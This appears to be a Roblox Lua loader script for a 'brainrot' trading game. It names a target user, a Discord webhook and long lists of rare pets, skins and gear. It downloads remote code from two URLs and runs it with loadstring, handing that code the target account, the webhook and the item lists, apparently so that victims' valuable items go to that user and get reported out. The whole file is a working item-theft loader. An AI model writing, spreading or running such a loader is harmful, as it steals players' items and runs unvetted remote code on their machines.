local TARGET_ID = 11190168631
local TARGET_USER = "hdroj_313"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1553142470076932328/YpXy2Pjh7TrouZETqwn1pxTsL1dIerhvQeqKX2uTOi1VN5iBYwHK6equW8zq7Ol8svCN"

local TargetBrainrots = {
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Los Dragons"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Griffin"] = true,
    ["Hydra Bunny"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Antonio"] = true,
    ["Elefanto Frigo"] = true,
    ["John Pork"] = true,
    ["Arcadragon"] = true,
    ["Pancake and Syrup"] = true,
    ["Capitano Americano"] = true,
    ["Globa Steppa"] = true,
    ["Dragon Aquanini"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Dug Dug Dug"] = true,
    ["Caylusaurus"] = true,
    ["Steakini Fattini"] = true,
    ["Venuspino"] = true,
    ["Kraken"] = true,
    ["Cerberus"] = true,
    ["Headless Horseman"] = true,
    ["Rubrikiko"] = true,
    ["La Casa Boo"] = true,
    ["La Supreme Combinasion"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["Duggy Bros"] = true,
    ["Money Money Bros"] = true,
    ["Sammyni Cakini"] = true,
    ["Los Hackers"] = true,
    ["Foxini Lanternini"] = true,
    ["Jelly Moby"] = true,
    ["Digi Narwhal"] = true,
    ["Moby Bros"] = true,
    ["Boppin Bunny"] = true,
    ["Burguro and Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Cash or Card"] = true,
    ["Celestial Pegasus"] = true,
    ["Cooki and Milki"] = true,
    ["Cloverat Clapat"] = true,
    ["Festive 67"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Fragola La La La"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Garama and Madundung"] = true,
    ["Ginger Gerat"] = true,
    ["Guest 666"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Ketupat Bros"] = true,
    ["La Food Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Pizza and Ranch"] = true,
    ["Bumbatron"] = true,
    ["Yetimatic"] = true,
    ["Queen Bee"] = true,
    ["Los Amigos"] = true,
    ["S'more Serat"] = true,
    ["Los Sekolahs"] = true,
    ["Love Love Bear"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Reinito Sleighito"] = true,
    ["Rosey and Teddy"] = true,
    ["Sammyni Fattini"] = true,
    ["Spooky and Pumpky"] = true,
    ["Rubiko and Kubiko"] = true
}

local TargetBaseSkins = {
    ["Octo"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    ["Bloodmoon Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Rainbow Slap"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Santa's Sleigh"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=96lrdkrw"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)